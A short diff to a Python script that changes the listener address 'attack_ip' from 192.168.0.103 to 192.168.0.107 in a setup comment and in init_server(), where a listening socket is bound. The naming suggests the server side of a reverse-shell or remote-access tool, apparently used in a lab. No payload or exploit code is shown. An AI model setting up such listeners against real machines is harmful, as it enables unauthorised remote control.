@@ -39,7 +39,7 @@
 # ------------
 # GO TO THE BOTTOM OF THE SCRIPT, IN THE init_server() FUNCTION
 # LOOK FOR THE FOLLOWING FIELDS UNDER "# details of the listening machine" - 
-# attack_ip = "192.168.0.103"
+# attack_ip = "192.168.0.107"
 # listen_port = 54321
 # CHANGE THE VALUES WITHIN THE ANGLE BRACKETS 
 #
@@ -299,7 +299,7 @@ def init_server():
 		sock.setsockopt(sc.SOL_SOCKET, sc.SO_REUSEADDR, 1)
 	
 	# details of the listening machine
-		attack_ip = "192.168.0.103"
+		attack_ip = "192.168.0.107"
 		listen_port = 54321
 	# sock.bind(<MY_IP>, <MY_PORT>)
 		print("[!] Setting up Listener with IP = " + attack_ip + " on port = " + str(listen_port))
